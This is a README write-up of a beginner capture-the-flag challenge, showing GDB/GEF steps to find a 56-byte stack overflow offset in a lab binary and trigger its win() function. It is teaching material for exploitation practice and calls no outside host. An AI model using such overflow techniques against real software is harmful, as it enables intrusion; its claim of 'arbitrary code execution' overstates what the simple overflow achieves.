# Console-Rodeo-Binary-Exploitation-CTF-2023
A repo detailing the steps on the binary exploitation CTF

# Step 1: Identify the offset calculation using GDB
First, we need to calculate how many times it will take to crash the program! We can use `gdb` to calculate the offset!

***Terminal:***
```bash
dilldylanpickle@archlinux:~/Console-Rodeo-Binary-Exploitation-CTF-2023$ gdb challenge0
GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
GEF for linux ready, type `gef' to start, `gef config' to configure
89 commands loaded and 5 functions added for GDB 12.1 in 0.00ms using Python engine 3.10
gef➤
```

Next, we can set a break point at main in order to create a pattern!

***Terminal:***
```bash
gef➤  break main
Breakpoint 1 at 0x4011e5: file challenge0.c, line 32.
gef➤
```

Then, we can create a pattern that we will use to crash the program!

***Terminal:***
```bash
gef➤  pattern create 72
[+] Generating a pattern of 72 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaa
[+] Saved as '$_gef0'
gef➤
```

Now, we can run the program and input our pattern!

***Terminal:***
```bash
gef➤  run
gef➤  continue
Continuing.
How many characters does it take to crash :)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaa
```

Finally, we need to find out the values that are overwriting memory.

***Terminal:***
```bash
...
──────────────────────────────────────────────────────────────────────────────────────────── stack ────0x00007fffffffe048│+0x0000: "haaaaaaaiaaaaaaa"   ← $rsp
0x00007fffffffe050│+0x0008: "iaaaaaaa"
0x00007fffffffe058│+0x0010: 0x0000000100401000
0x00007fffffffe060│+0x0018: 0x0000000000000001
0x00007fffffffe068│+0x0020: 0x00007ffff7db5d90  →  <__libc_start_call_main+128> mov edi, eax
0x00007fffffffe070│+0x0028: 0x0000000000000000
0x00007fffffffe078│+0x0030: 0x00000000004011d2  →  <main+0> endbr64
0x00007fffffffe080│+0x0038: 0x00000001ffffe160
────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────     0x4011ca <overflow+64>    call   0x401170 <fail>
     0x4011cf <overflow+69>    nop
     0x4011d0 <overflow+70>    leave
 →   0x4011d1 <overflow+71>    ret
[!] Cannot disassemble from $PC
─────────────────────────────────────────────────────────────────────────── source:challenge0.c+28 ────     23      if (overflow > 0) {
     24          win();
     25      } else {
     26          fail();
     27      }
 →   28  }
     29
     30  int main(int argc, char *argv[])
     31  {
     32      overflow();
     33
────────────────────────────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: "challenge0", stopped 0x4011d1 in overflow (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────────── trace ────[#0] 0x4011d1 → overflow()
───────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

For now, we can see that `haaaaaaaiaaaaaaa` is overwriting our memory! Let's use `pattern search` to calculate the offset.

```bash
gef➤  pattern search haaaaaaaiaaaaaaa
[+] Searching for '61616161616161696161616161616168'/'68616161616161616961616161616161' with period=8
[+] Found at offset 56 (big-endian search)
gef➤
```

Now, we can overwrite the exact amount of memory in order to achieve arbitrary code execution!

We can use `python3` and generate an amount of characters rather than manually typing out a string:

```python
dilldylanpickle@linux:~/Console-Rodeo-Binary-Exploitation-CTF-2023$ python3
Python 3.10.12 (main, Jun 11 2023, 05:26:28) [GCC 11.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> print(b'i'*56)
b'iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii'
>>> quit()
```

Finally, we can send in the string to win!

```bash
dilldylanpickle@linux:~/Console-Rodeo-Binary-Exploitation-CTF-2023$ ./challenge0
How many characters does it take to crash :)
iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii
Congratulations! You win!
Segmentation fault
dilldylanpickle@linux:~/Console-Rodeo-Binary-Exploitation-CTF-2023$
```